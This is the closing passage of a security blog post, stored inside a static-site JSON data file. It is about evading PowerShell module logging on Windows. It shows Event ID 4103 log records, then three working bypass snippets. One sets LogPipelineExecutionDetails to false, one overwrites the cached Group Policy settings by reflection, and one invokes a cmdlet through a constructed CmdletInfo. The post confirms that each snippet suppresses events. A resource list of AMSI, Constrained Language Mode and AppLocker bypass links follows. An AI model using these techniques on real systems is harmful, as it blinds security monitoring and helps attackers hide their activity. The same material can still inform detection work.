UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">18</span> Command Name = <span class=\"built_in\">Write-Host</span> Command <span class=\"built_in\">Type</span> = Cmdlet Script Name = Command Path = Sequence Number = <span class=\"number\">48</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Write-Host</span>): <span class=\"string\">&quot;Write-Host&quot;</span> ParameterBinding(<span class=\"built_in\">Write-Host</span>): name=<span class=\"string\">&quot;Object&quot;</span>; value=<span class=\"string\">&quot;@N1NJ10 was here&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn‚Äôt produce pipeline output.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8238426Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">287</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0002-d03b-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">18</span> Command Name = Command <span class=\"built_in\">Type</span> = Script Script Name = Command Path = Sequence Number = <span class=\"number\">50</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Out-Default</span>): <span class=\"string\">&quot;Out-Default&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, <strong>and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )</strong></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8268015Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">288</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0000-af3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">20</span> Command Name = <span class=\"built_in\">Set-StrictMode</span> Command <span class=\"built_in\">Type</span> = Cmdlet Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\<span class=\"number\">2.0</span>.<span class=\"number\">0</span>\\PSReadLine.psm1 Command Path = Sequence Number = <span class=\"number\">52</span> User = DESKTOP<span class=\"literal\">-47K3P38</span>\\<span class=\"number\">3</span>atef Connected User = Shell ID = Microsoft.PowerShell&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(<span class=\"built_in\">Set-StrictMode</span>): <span class=\"string\">&quot;Set-StrictMode&quot;</span> ParameterBinding(<span class=\"built_in\">Set-StrictMode</span>): name=<span class=\"string\">&quot;Off&quot;</span>; value=<span class=\"string\">&quot;True&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<p>So the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let‚Äôs do it</p>\n<p>In this blog by <a href=\"https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/\">HUBBL3</a> , We can see that it‚Äôs not possible to completely block module logging for all modules (even if we use <code>*</code> to include all modules in logging). However, it is possible to bypass logging for specific cmdlets</p>\n<blockquote>\n<ul>\n<li>When the <a href=\"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events\"><strong>LogPipelineExecutionDetails</strong></a>property value is <code>$true</code>, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.</li>\n<li>A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell‚Äôs functionality.</li>\n<li>The ‚Äú4103‚Äù Event-ID is for the Module loggin</li>\n<li>Path for the Events : Event Viewer -&gt; Applications and Services -&gt; Microsoft -&gt; Windows -&gt; PowerShell -&gt; Operational<br>{: .prompt-info }</li>\n</ul>\n</blockquote>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Recon</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Command</span> <span class=\"built_in\">Write-Host</span>).module</span><br><span class=\"line\"><span class=\"built_in\">Get-PSSnapin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 1 </span></span><br><span class=\"line\"><span class=\"variable\">$module</span> = <span class=\"built_in\">Get-Module</span> Microsoft.PowerShell.Utility</span><br><span class=\"line\"><span class=\"variable\">$module</span>.LogPipelineExecutionDetails = <span class=\"variable\">$false</span></span><br><span class=\"line\"><span class=\"variable\">$Snapin</span> = <span class=\"built_in\">Get-PSSnapin</span> Microsoft.PowerShell.Core</span><br><span class=\"line\"><span class=\"variable\">$Snapin</span>.LogPipelineExecutionDetails = <span class=\"variable\">$false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 2 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$GroupPolicy</span> =[<span class=\"type\">ReF</span>].assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Utils&#x27;</span>).GetFielD(<span class=\"string\">&#x27;cachedGroupPolicySettings&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class=\"variable\">$nULL</span>);</span><br><span class=\"line\"><span class=\"variable\">$val</span>=[<span class=\"type\">Collections.Generic.Dictionary</span>[<span class=\"built_in\">String</span>,<span class=\"type\">System.Object</span>]]::new();</span><br><span class=\"line\"><span class=\"variable\">$Val</span>.Add(<span class=\"string\">&#x27;EnableModuleLogging&#x27;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$Val</span>.add(<span class=\"string\">&#x27;ModuleNames&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$GroupPolicy</span>[<span class=\"string\">&#x27;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging&#x27;</span>]=<span class=\"variable\">$VaL</span></span><br><span class=\"line\"><span class=\"built_in\">Import-Module</span> Microsoft.Powershell.Utility <span class=\"literal\">-Force</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Bypass 3 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$Cmd</span> = [<span class=\"type\">System.Management.Automation.CmdletInfo</span>]::new(<span class=\"string\">&quot;Write-Host&quot;</span>, [<span class=\"type\">Microsoft.PowerShell.Commands.WriteHostCommand</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Test </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;@N1NJ10 was here&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Test for Bypass 3 </span></span><br><span class=\"line\"></span><br><span class=\"line\">&amp; <span class=\"variable\">$Cmd</span> <span class=\"string\">&quot;@N1NJ10 was here&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see what event that the first bypass will trigger</p>\n<p>With the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be</p>\n<ul>\n<li>4 From the PSConsoleHostReadLine</li>\n<li>2 From an unknown Events ( Like the Write-Host ‚Ä¶ )</li>\n</ul>\n<p>Let‚Äôs see</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def37.png\" alt=\"\"></figure>\n\n<p>As we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )</p>\n<blockquote>\n<ul>\n<li>Don‚Äôt Forget to Clear the logs after some operations to see what the new operations new logs</li>\n<li>If you use script block you will get 2 events<br>{: .prompt-tip }</li>\n</ul>\n</blockquote>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def38.png\" alt=\"\"></figure>\n\n<p>So , Let‚Äôs test to see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def39.png\" alt=\"\"></figure>\n\n<p>Great , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )</p>\n<h2 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h2><p>I don‚Äôt talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios</p>\n<p>I will provide you with some of these resources enjoy :</p>\n<ul>\n<li><a href=\"https://amsi.fail/\">Amsi.fail</a></li>\n<li><a href=\"https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\">Exploring PowerShell AMSI and Logging Evasion</a></li>\n<li><a href=\"https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/\">Bypass AMSI by manual modification</a></li>\n<li><a href=\"https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca\">PowerShell get information about AntiVirus</a></li>\n<li><a href=\"https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1\">Beginners-Guide-to-Obfuscation</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s\">Evading Detection: A Beginner‚Äôs Guide to Obfuscation - 2022</a></li>\n<li><a href=\"https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/\">A Detailed Guide on AMSI Bypass</a></li>\n<li><a href=\"https://www.thehacker.recipes/evasion/av/obfuscation\">the hacker recipes obfuscation</a></li>\n<li><a href=\"https://github.com/RythmStick/AMSITrigger\">AMSITrigger</a></li>\n<li><a href=\"https://github.com/gatariee/gocheck\">gocheck</a></li>\n<li><a href=\"https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/\">AMSI BYPASS AND EVASION</a></li>\n<li><a href=\"https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b\">AMSI Bypass Memory Patch Technique in 2024</a></li>\n<li><a href=\"https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/\">amsi-bypass-methods</a></li>\n<li><a href=\"https://lolbas-project.github.io/\">lolbas-project</a></li>\n<li><a href=\"https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html\">The Internals of AppLocker</a></li>\n<li><a href=\"https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/\">Windows Applocker Policy ‚Äì A Beginner‚Äôs Guide</a></li>\n<li><a href=\"https://pentestlab.blog/2021/05/17/persistence-amsi/\">persistence-amsi</a></li>\n<li><a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain\">Constrained Language constrain?</a> - <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\">What is PowerShell Constrained Language?</a></li>\n<li><a href=\"https://www.ired.team/offensive-security/code-execution/t1118-installutil\">InstallUtil</a></li>\n<li><a href=\"https://github.com/khr0x40sh/WhiteListEvasion\">WhiteListEvasion</a></li>\n<li><a href=\"https://github.com/vinsworldcom/NetCat64/releases\">NetCat64</a></li>\n<li><a href=\"https://sp00ks-git.github.io/posts/CLM-Bypass/\">CLM-Bypass</a></li>\n<li><a href=\"https://github.com/microsoft/AaronLocker\">AaronLocker</a></li>\n<li><a href=\"https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks\">one-thousand-and-one-application-blocks</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\">sysmon</a></li>\n<li><a href=\"https://github.com/mgeeky/Stracciatella\">Stracciatella</a></li>\n<li>Manual Pages</li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cmij2yuof000a9reufzdk2ymd","category_id":"cmij2yuok000b9reu68t11xu8","_id":"cmij2yuon000e9reub9bz6bdr"},{"post_id":"cmij30lbk000q9reu0tui8yth","category_id":"cmij32jx900139reu3nvx5o2h","_id":"cmij32jx900149reuf7dwh524"}],"PostTag":[{"post_id":"cmij2yuof000a9reufzdk2ymd","tag_id":"cmij2yuom000c9reu0n2y3cfz","_id":"cmij2yuon000d9reucenv6k16"},{"post_id":"cmij30lbk000q9reu0tui8yth","tag_id":"cmij30ajg000h9reub1u3at0w","_id":"cmij31x1f00129reubibbcm3r"},{"post_id":"cmij30lbk000q9reu0tui8yth","tag_id":"cmij31qbn00109reuets9d0o9","_id":"cmij39f1g00159reucq2n98py"}],"Tag":[{"name":"MacOS","_id":"cmij2yuom000c9reu0n2y3cfz"},{"name":"Evasion","_id":"cmij30ajg000h9reub1u3at0w"},{"name":"Windows","_id":"cmij31qbn00109reuets9d0o9"}]}}